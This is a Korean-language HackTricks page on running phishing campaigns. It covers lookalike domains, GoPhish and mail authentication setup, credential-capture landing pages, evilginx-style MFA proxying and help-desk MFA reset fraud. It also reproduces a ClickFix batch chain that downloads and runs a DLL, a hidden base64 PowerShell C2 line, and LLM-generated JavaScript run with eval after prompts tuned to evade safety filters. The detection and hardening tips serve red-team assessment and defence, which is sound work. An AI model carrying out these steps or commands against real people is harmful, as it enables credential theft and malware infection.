# 피싱 방법론

{{#include ../../banners/hacktricks-training.md}}

## 방법론

1. 대상 Recon
1. **대상 도메인**을 선택합니다.
2. 대상이 사용하는 로그인 포털을 찾기 위해 기본적인 웹 열거를 수행하고 어떤 포털을 **사칭**할지 **결정**합니다.
3. 일부 **OSINT**를 사용해 **이메일을 찾기**.
2. 환경 준비
1. phishing assessment에 사용할 **도메인 구매**
2. 이메일 서비스 관련 레코드(SPF, DMARC, DKIM, rDNS) **구성**
3. VPS에 **gophish** 구성
3. 캠페인 준비
1. **이메일 템플릿** 준비
2. 자격 증명을 훔치기 위한 **웹 페이지** 준비
4. 캠페인 시작!

## 유사 도메인 생성 또는 신뢰된 도메인 구매

### 도메인 이름 변형 기법

- **키워드**: 도메인 이름이 원본 도메인의 중요한 **키워드**를 **포함**합니다 (예: zelster.com-management.com).
- **hypened subdomain**: 서브도메인의 **점(.)을 하이픈(-)으로 변경** (예: www-zelster.com).
- **New TLD**: 동일 도메인에 **새 TLD** 사용 (예: zelster.org)
- **Homoglyph**: 도메인 내 글자를 **유사하게 보이는 문자**로 **대체** (예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 도메인 이름 내에서 두 글자를 **교환**합니다 (예: zelsetr.com).
- **Singularization/Pluralization**: 도메인 끝에 “s”를 추가하거나 제거합니다 (예: zeltsers.com).
- **Omission**: 도메인에서 한 글자를 **제거**합니다 (예: zelser.com).
- **Repetition:** 도메인 내 글자 중 하나를 **반복**합니다 (예: zeltsser.com).
- **Replacement**: Homoglyph와 유사하지만 덜 은밀합니다. 도메인의 문자 중 하나를 교체하며, 종종 원래 문자와 키보드상 인접한 문자로 대체합니다 (예: zektser.com).
- **Subdomained**: 도메인 이름 안에 **점(.)**을 도입합니다 (예: ze.lster.com).
- **Insertion**: 도메인 이름에 문자를 **삽입**합니다 (예: zerltser.com).
- **Missing dot**: 도메인 이름 뒤에 TLD를 붙여 점을 빠뜨립니다 (예: zelstercom.com)

**자동화 도구**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**웹사이트**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

저장되거나 전송 중인 일부 비트가 태양 플레어, cosmic rays, 또는 하드웨어 오류와 같은 요인으로 인해 자동으로 뒤집힐 **가능성**이 있습니다.

이 개념이 **DNS 요청에 적용될 때**, **DNS 서버가 수신한 도메인**이 처음 요청된 도메인과 동일하지 않을 수 있습니다.

예를 들어, 도메인 "windows.com"의 단일 비트 수정이 "windnws.com"으로 바뀔 수 있습니다.

공격자는 **이 점을 이용해 피해자 도메인과 유사한 여러 bit-flipping 도메인을 등록**할 수 있으며, 그 목적은 정상 사용자를 자신의 인프라로 리디렉션하는 것입니다.

자세한 내용은 다음을 읽어보세요 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### 신뢰할 수 있는 도메인 구매

사용 가능한 만료된 도메인을 [https://www.expireddomains.net/](https://www.expireddomains.net)에서 검색할 수 있습니다.  
구매하려는 만료 도메인이 **이미 좋은 SEO를 가지고 있는지** 확인하려면 다음에서 어떻게 분류되는지 검색하세요:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 이메일 발견

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% 무료)
- [https://phonebook.cz/](https://phonebook.cz) (100% 무료)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

더 많은 유효한 이메일 주소를 발견하거나 이미 발견한 주소를 검증하려면 대상의 SMTP 서버에 대해 브루트포스가 가능한지 확인할 수 있습니다. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).  
또한 사용자가 **메일 접근을 위해 어떤 웹 포털을 사용하는 경우**, 해당 포털이 **username brute force**에 취약한지 확인하고 가능하면 해당 취약점을 악용하세요.

## GoPhish 구성

### 설치

다음에서 다운로드할 수 있습니다: [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

다운로드 후 `/opt/gophish`에 압축을 풀고 `/opt/gophish/gophish`를 실행하세요.  
실행 출력에 포트 3333용 admin 사용자 비밀번호가 제공됩니다. 따라서 해당 포트에 접속하여 해당 자격증명으로 admin 비밀번호를 변경하세요. 이 포트를 로컬로 터널링해야 할 수 있습니다:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 구성

**TLS 인증서 구성**

이 단계 전에 사용하려는 도메인을 이미 구매했어야 하며, 해당 도메인은 gophish를 구성하는 VPS의 IP를 가리키고 있어야 합니다.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**메일 설정**

설치 시작: `apt-get install postfix`

그런 다음 도메인을 다음 파일들에 추가하세요:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**또한 /etc/postfix/main.cf 내부의 다음 변수 값들을 변경하세요**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

마지막으로 파일 **`/etc/hostname`** 및 **`/etc/mailname`** 을(를) 도메인 이름으로 수정하고 **VPS를 재시작**하세요.

이제 `mail.<domain>`의 **DNS A record**를 VPS의 **ip address**로 설정하고, `mail.<domain>`을 가리키는 **DNS MX** 레코드를 생성하세요.

이제 이메일 전송을 테스트해봅니다:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 구성**

gophish의 실행을 중지하고 구성합시다.\
다음과 같이 `/opt/gophish/config.json`을 수정하세요 (https 사용에 유의):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish 서비스 구성**

gophish 서비스를 자동으로 시작하고 서비스로 관리할 수 있도록 하려면 `/etc/init.d/gophish` 파일을 다음 내용으로 생성하면 됩니다:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
서비스 구성 완료 및 동작 확인:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 메일 서버 및 도메인 구성

### 기다리고 신뢰 얻기

도메인이 오래될수록 spam으로 분류될 확률이 낮아집니다. 따라서 phishing assessment 전에 가능한 한 오래(최소 1주일) 기다려야 합니다. 또한 평판이 중요한 섹터에 대한 페이지를 올려두면 얻는 평판이 더 좋아집니다.

일주일을 기다려야 하더라도 지금 모든 설정은 완료해둘 수 있습니다.

### Reverse DNS (rDNS) 레코드 구성

VPS의 IP 주소가 도메인 이름으로 역방향 해석되도록 rDNS (PTR) 레코드를 설정하세요.

### Sender Policy Framework (SPF) Record

You must **configure a SPF record for the new domain**. If you don't know what is a SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

You can use [https://www.spfwizard.net/](https://www.spfwizard.net) to generate your SPF policy (use the IP of the VPS machine)

![](<../../images/image (1037).png>)

도메인 내 TXT 레코드에 설정해야 하는 내용은 다음과 같습니다:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 도메인 기반 메시지 인증, 보고 및 적합성 (DMARC) 레코드

새 도메인에 대해 **DMARC 레코드를 구성해야 합니다**. DMARC 레코드가 무엇인지 모른다면 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

다음 내용을 사용하여 호스트명 `_dmarc.<domain>`를 가리키는 새 DNS TXT 레코드를 생성해야 합니다:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

새 도메인에 대해 **DKIM을 구성해야 합니다**. DMARC 레코드가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM 키가 생성하는 두 개의 B64 값을 하나로 이어붙여야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 이메일 구성 점수 테스트

다음 사이트를 사용하여 확인할 수 있습니다: [https://www.mail-tester.com/](https://www.mail-tester.com/)\
페이지에 접속해서 그들이 제공하는 주소로 이메일을 보내면 됩니다:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
또한 `check-auth@verifier.port25.com`로 이메일을 보내 **이메일 설정을 확인**하고 응답을 **읽어보세요** (이를 위해서는 port **25**를 **열어야** 하며, 루트로 이메일을 보낸 경우 응답은 파일 _/var/mail/root_에서 확인할 수 있습니다).\
모든 테스트를 통과했는지 확인하세요:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
또한 본인이 제어하는 Gmail로 **메시지를 보내고**, Gmail 받은편지함에서 **이메일의 헤더**를 확인할 수 있습니다. `dkim=pass`는 `Authentication-Results` 헤더 필드에 있어야 합니다.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse 블랙리스트에서 제거

The page [www.mail-tester.com](https://www.mail-tester.com) 는 도메인이 Spamhaus에 의해 차단되고 있는지 알려줄 수 있습니다. 도메인/IP 제거를 요청하려면 다음에서 신청하세요: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft 블랙리스트에서 제거

​​도메인/IP 제거는 [https://sender.office.com/](https://sender.office.com) 에서 요청할 수 있습니다.

## GoPhish 캠페인 생성 및 실행

### 발송 프로필

- 발신자 프로필을 식별할 **이름을 설정**  
- 어떤 계정에서 피싱 이메일을 보낼지 결정하세요. 제안: _noreply, support, servicedesk, salesforce..._  
- 사용자 이름과 비밀번호를 비워 둘 수 있지만, **Ignore Certificate Errors**에 체크했는지 확인하세요

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 모든 것이 제대로 동작하는지 확인하려면 '**Send Test Email**' 기능을 사용하는 것이 좋습니다.\
> 테스트 중 블랙리스트에 오르는 것을 피하려면 **send the test emails to 10min mails addresses** 하는 것을 권장합니다.

### 이메일 템플릿

- 템플릿을 식별할 **이름을 설정**  
- 그런 다음 **제목**을 작성하세요 (이상하지 않고 일반 이메일에서 볼 법한 제목)  
- **Add Tracking Image**에 체크했는지 확인하세요  
- **이메일 템플릿**을 작성하세요 (다음 예제처럼 변수를 사용할 수 있습니다):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
참고: **이메일의 신뢰성을 높이기 위해**, 클라이언트 이메일의 서명을 사용하는 것이 권장됩니다. 제안:

- **존재하지 않는 주소**로 이메일을 보내고 응답에 서명이 있는지 확인하세요.
- info@ex.com, press@ex.com 또는 public@ex.com 같은 **공용 이메일**을 찾아 이메일을 보내고 응답을 기다리세요.
- 발견한 **유효한 이메일**로 연락을 시도하고 응답을 기다리세요.

![](<../../images/image (80).png>)

> [!TIP]
> Email Template는 **보낼 파일을 첨부**할 수도 있습니다. 특별히 제작한 파일/문서를 이용해 NTLM challenge를 탈취하고 싶다면 [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### 랜딩 페이지

- **이름 작성**
- 웹 페이지의 **HTML 코드를 작성하세요**. 웹 페이지를 **import**할 수 있습니다.
- **Capture Submitted Data**와 **Capture Passwords**를 표시하세요.
- **리디렉션**을 설정하세요.

![](<../../images/image (826).png>)

> [!TIP]
> 보통은 페이지의 HTML 코드를 수정하고 로컬에서(예: Apache 서버를 사용해) **원하는 결과가 나올 때까지** 테스트를 해야 합니다. 그런 다음 그 HTML 코드를 박스에 입력하세요.\
> HTML에 **정적 리소스**(예: CSS, JS)가 필요하다면 이를 _**/opt/gophish/static/endpoint**_에 저장하고 _**/static/\<filename>**_에서 접근할 수 있습니다.

> [!TIP]
> 리디렉션의 경우 사용자를 피해자 사이트의 **정상 메인 페이지로 돌려보내거나** 예를 들어 _/static/migration.html_로 리디렉션한 뒤, 5초 동안 **스피닝 휠(**[**https://loading.io/**](https://loading.io)**)**을 보여주고 프로세스가 성공했다고 알리는 방식이 유용할 수 있습니다.

### 사용자 및 그룹

- 이름 설정
- **Import the data** (예제 템플릿을 사용하려면 각 사용자에 대해 firstname, last name, email address가 필요합니다)

![](<../../images/image (163).png>)

### 캠페인

마지막으로 이름, email template, landing page, URL, sending profile 및 group을 선택하여 캠페인을 생성하세요. URL은 피해자에게 전송될 링크가 됩니다.

Sending Profile을 이용하면 최종 피싱 이메일이 어떻게 보일지 확인하기 위해 테스트 이메일을 보낼 수 있습니다:

![](<../../images/image (192).png>)

> [!TIP]
> 테스트를 진행할 때 차단되거나 블랙리스트에 오르는 것을 피하려면 테스트 이메일을 **10min mails 주소들**로 보내는 것을 권장합니다.

모든 준비가 끝나면 캠페인을 시작하세요!

## 웹사이트 클로닝

어떤 이유로든 웹사이트를 클론하려면 다음 페이지를 확인하세요:


{{#ref}}
clone-a-website.md
{{#endref}}

## 백도어 문서 및 파일

일부 피싱 평가(주로 Red Teams)에서는 **백도어가 포함된 파일**(예: C2 또는 인증을 유발하는 파일)을 전송하고자 할 수 있습니다. 예제는 다음 페이지를 확인하세요:


{{#ref}}
phishing-documents.md
{{#endref}}

## 피싱 MFA

### 프록시 MitM를 통한 방법

이전 공격은 실제 웹사이트를 가장하고 사용자가 입력한 정보를 수집한다는 점에서 꽤 영리합니다. 불행히도 사용자가 올바른 비밀번호를 입력하지 않았거나 당신이 가장한 애플리케이션이 2FA로 구성되어 있다면, **이 정보만으로는 속은 사용자를 가장할 수 없습니다**.

이때 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) 및 [**muraena**](https://github.com/muraenateam/muraena) 같은 도구들이 유용합니다. 이런 도구들은 MitM과 유사한 공격을 생성할 수 있게 해줍니다. 기본적인 동작 방식은 다음과 같습니다:

1. 실제 웹페이지의 로그인 폼을 **가로챕니다**.
2. 사용자가 가짜 페이지에 **자격증명(credential)**을 전송하면 도구가 이를 실제 웹페이지로 전송하여 **자격증명이 동작하는지 확인**합니다.
3. 계정에 **2FA**가 설정되어 있으면 MitM 페이지가 2FA를 요구하고 사용자가 입력하면 도구가 이를 실제 웹페이지로 전송합니다.
4. 사용자가 인증되면 공격자는 도구가 MitM을 수행하는 동안 **자격증명, 2FA, 쿠키 및 모든 상호작용 정보를 캡처**하게 됩니다.

### VNC를 통한 방법

원본과 동일한 모양의 악성 페이지로 피해자를 유도하는 대신, 그를 **실제 웹페이지에 연결된 브라우저가 있는 VNC 세션**으로 보내면 어떻게 될까요? 사용자가 무엇을 하는지 볼 수 있고 비밀번호, MFA, 쿠키 등을 훔칠 수 있습니다.\
이런 방식은 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)로 구현할 수 있습니다.

## 탐지 여부 확인

자신이 들통났는지 확인하는 가장 쉬운 방법 중 하나는 **도메인을 블랙리스트에서 검색하는 것**입니다. 도메인이 목록에 올라 있다면 어떤 방식으로든 의심 대상으로 감지된 것입니다.\
도메인이 블랙리스트에 올라 있는지 확인하는 쉬운 방법 중 하나는 [https://malwareworld.com/](https://malwareworld.com) 을 이용하는 것입니다.

하지만 피해자가 **실제 환경에서 의심스러운 피싱 활동을 능동적으로 찾고 있는지**를 알아내는 다른 방법들도 있습니다. 자세한 내용은 다음을 참조하세요:


{{#ref}}
detecting-phising.md
{{#endref}}

피해자 도메인과 매우 유사한 이름의 도메인을 구매하거나, 당신이 통제하는 도메인의 **서브도메인에 대해** 피해자 도메인의 **키워드**를 포함한 **인증서**를 발급받을 수 있습니다. 피해자가 해당 도메인들에 대해 어떤 형태의 **DNS 또는 HTTP 상호작용**을 수행하면, 그가 **능동적으로 의심 도메인을 찾고 있다는 것**을 알 수 있으며 매우 은밀하게 행동해야 합니다.

### 피싱 평가

이메일이 스팸 폴더로 들어가는지, 차단되는지 또는 성공할지를 평가하려면 [**Phishious** ](https://github.com/Rices/Phishious)를 사용하세요.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

현대의 침투 세트는 점점 이메일 유인 없이 직접 서비스 데스크/신원 복구 워크플로를 겨냥하여 MFA를 무력화시키는 방식을 선호합니다. 이 공격은 완전히 "living-off-the-land" 방식입니다: 운영자가 유효한 자격증명을 손에 넣으면 내장된 관리 도구들로 피벗하며 – 별도의 악성코드는 필요하지 않습니다.

### 공격 흐름
1. Recon 대상 탐색
* LinkedIn, 데이터 유출, 공개 GitHub 등에서 개인 및 회사 정보를 수집합니다.
* 고가치 신원(임원, IT, 재무 등)을 식별하고 비밀번호/MFA 재설정에 대한 **정확한 헬프데스크 절차**를 열거합니다.
2. 실시간 소셜 엔지니어링
* 전화, Teams 또는 채팅으로 헬프데스크에 대상인 척 연락합니다(종종 **발신자 ID 스푸핑** 또는 **음성 복제** 사용).
* 사전에 수집한 PII를 제공하여 지식 기반 인증을 통과합니다.
* 상담원을 설득하여 **MFA 시크릿을 재설정**하거나 등록된 휴대폰 번호에 대해 **SIM 스왑**을 수행하도록 합니다.
3. 즉시 수행하는 접근 후 조치(실제 사례에서 ≤60분)
* 웹 SSO 포털을 통해 발판을 마련합니다.
* 내장 도구로 AD / AzureAD를 열거합니다(이진 파일을 떨어뜨리지 않음):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 이미 환경에서 화이트리스트된 정당한 **RMM** 에이전트나 **WMI**, **PsExec** 등을 이용한 횡적 이동 수행.

### 탐지 및 완화
* 헬프데스크 신원 복구를 **권한 작업(privileged operation)**으로 취급하세요 – step-up 인증 및 관리자 승인 요구.
* **Identity Threat Detection & Response (ITDR)** / **UEBA** 규칙을 배치하여 다음을 경고:
  * MFA 방식 변경 + 신규 장치/지리에서의 인증.
  * 동일 주체의 즉각적인 권한 상승(사용자→관리자).
* 헬프데스크 콜을 기록하고 어떤 재설정이든 **이미 등록된 번호로 콜백**을 요구하세요.
* 새로 재설정된 계정이 자동으로 높은 권한 토큰을 상속하지 않도록 **Just-In-Time (JIT) / Privileged Access**를 구현하세요.

---

## 대규모 속임수 – SEO Poisoning & “ClickFix” 캠페인
상업적 규모의 그룹들은 고접촉 작업의 비용을 상쇄하기 위해 **검색 엔진 & 광고 네트워크를 배달 채널로 전환**하는 대량 공격을 수행합니다.

1. **SEO poisoning / malvertising**가 `chromium-update[.]site` 같은 가짜 결과를 검색 광고 상위에 밀어 넣습니다.
2. 피해자는 작은 **1단계 로더**(대개 JS/HTA/ISO)를 다운로드합니다. Unit 42에서 관찰된 예:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. 로더는 브라우저 쿠키 + 자격증명 DB를 탈취한 뒤 **무음 로더**를 불러옵니다. 무음 로더는 *실시간으로* 배포 여부를 결정합니다:
* RAT (예: AsyncRAT, RustDesk)
* 랜섬웨어 / 와이퍼
* 지속성 컴포넌트(레지스트리 Run 키 + 예약 작업)

### 하드닝 팁
* 새로 등록된 도메인을 차단하고 검색 광고뿐 아니라 이메일에 대해서도 **Advanced DNS / URL Filtering**을 적용하세요.
* 소프트웨어 설치를 서명된 MSI / Store 패키지로 제한하고, 정책으로 `HTA`, `ISO`, `VBS` 실행을 차단하세요.
* 브라우저의 자식 프로세스가 설치 프로그램을 여는 경우를 모니터링하세요:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* 1단계 로더가 자주 악용하는 LOLBins(e.g. `regsvr32`, `curl`, `mshta`)를 헌팅하세요.

### ClickFix DLL 전달 기법 (가짜 CERT 업데이트)
* 미끼: 복제된 국가 CERT 권고문에 **Update** 버튼이 있어 단계별 “fix” 지침을 보여줍니다. 피해자에게 DLL을 다운로드하여 `rundll32`로 실행하라는 배치를 실행하도록 유도합니다.
* 관찰된 전형적인 배치 체인:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`가 페이로드를 `%TEMP%`에 저장하고, 짧은 대기(timeout)는 네트워크 지터를 숨기며, `rundll32`가 내보낸 엔트리포인트(`notepad`)를 호출합니다.
* DLL은 호스트 식별을 비콘으로 전송하고 몇 분마다 C2를 폴링합니다. 원격 명령은 **base64로 인코딩된 PowerShell** 형태로 도착하여 숨김(창 없이) 및 정책 우회를 통해 실행됩니다:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 이렇게 하면 C2 유연성(서버가 DLL을 업데이트할 필요 없이 작업을 교체할 수 있음)이 유지되고 콘솔 창이 숨겨집니다. `rundll32.exe`의 PowerShell 자식 프로세스 중 `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`이 함께 사용되는 것을 찾아 헌팅하세요.
* 수비측은 DLL 로드 이후 5분 폴링 간격과 함께 `...page.php?tynor=<COMPUTER>sss<USER>` 형태의 HTTP(S) 콜백을 주목할 수 있습니다.

---

## AI 강화 피싱 작전
공격자들은 이제 **LLM & voice-clone API**를 연계하여 완전 개인화된 미끼와 실시간 상호작용을 제작합니다.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|랜덤화된 문구와 추적 링크로 >100k 이메일/SMS 생성 및 전송.|
|Generative AI|공개된 M&A, 소셜 미디어의 내부 농담을 참조하는 일회성 이메일 생성; 콜백 사기에서 CEO 딥페이크 음성 사용.|
|Agentic AI|도메인을 자동 등록하고, 오픈소스 인텔을 스크래핑하며, 피해자가 클릭했지만 자격증명을 제출하지 않으면 다음 단계 이메일을 자동으로 작성.|

방어:
• ARC/DKIM 이상으로부터 자동화에서 전송된 메시지를 강조하는 **동적 배너**를 추가하세요.  
• 고위험 전화 요청에 대해 **음성 생체인증(voice-biometric) 챌린지 문구**를 배치하세요.  
• 인식 프로그램에서 AI 생성 미끼를 지속적으로 시뮬레이션하세요 – 정적 템플릿은 더 이상 유효하지 않습니다.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM 지원 런타임에서의 피싱 JavaScript 조립 (브라우저 내 코드 생성)

공격자는 평범해 보이는 HTML을 배포하고 **신뢰할 수 있는 LLM API**에 JavaScript 생성을 요청하여 런타임에 스틸러를 생성한 뒤 브라우저에서 실행(e.g., `eval` 또는 동적 `<script>`)할 수 있습니다.

1. **프롬프트를 통한 난독화:** exfil URL/Base64 문자열을 프롬프트에 인코딩하고, 안전 필터를 우회하고 환각을 줄이기 위해 문구를 반복 조정합니다.
2. **클라이언트 측 API 호출:** 로드 시 JS가 공개 LLM(Gemini/DeepSeek/etc.) 또는 CDN 프록시에 호출을 합니다; 정적 HTML에는 프롬프트/API 호출만 존재합니다.
3. **조립 및 실행:** 응답을 이어붙여 실행합니다(방문자별로 다형적 동작).
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 생성된 코드는 lure를 개인화(예: LogoKit token parsing)하고 prompt-hidden endpoint로 creds를 전송합니다.

**Evasion traits**
- 트래픽이 잘 알려진 LLM 도메인이나 신뢰할 수 있는 CDN 프록시로 향함; 때로는 백엔드로의 WebSockets를 통해 전송됨.
- 정적 payload 없음; 악성 JS는 렌더링 후에만 존재함.
- 비결정론적 생성은 세션마다 **unique** stealers를 생성함.

**Detection ideas**
- JS가 활성화된 샌드박스에서 실행; LLM 응답에서 유래한 **runtime `eval`/동적 스크립트 생성**을 탐지해 플래그 지정.
- 반환된 텍스트에 대해 즉시 `eval`/`Function`을 호출하는 front-end의 LLM API로의 POSTs를 수색.
- 클라이언트 트래픽에서 승인되지 않은 LLM 도메인이 탐지되고 그 이후 credential POSTs가 발생하면 경보 발생.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
클래식한 push-bombing 외에도, 공격자는 단순히 헬프데스크 통화 중에 **force a new MFA registration**을 수행하여 사용자의 기존 token을 무효화합니다. 이후의 로그인 프롬프트는 피해자에게 합법적으로 보입니다.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta에서 같은 IP에서 몇 분 내에 **`deleteMFA` + `addMFA`**가 발생하는 이벤트를 모니터링하세요.



## Clipboard Hijacking / Pastejacking

공격자는 탈취되었거나 typosquatted 웹페이지에서 악성 명령을 피해자의 클립보드로 조용히 복사한 뒤, 사용자가 **Win + R**, **Win + X** 또는 터미널 창에 붙여넣기하도록 속여 다운로드나 첨부파일 없이 임의의 코드를 실행시킬 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* APK는 정적 자격증명과 프로필별 “잠금 해제 코드”(서버 인증 없음)를 포함합니다. 피해자는 가짜 독점 흐름(로그인 → 잠긴 프로필 → unlock)을 따르며, 올바른 코드 입력 시 공격자가 제어하는 `+92` 번호로 된 WhatsApp 채팅으로 리디렉션되는 동안 spyware가 조용히 실행됩니다.
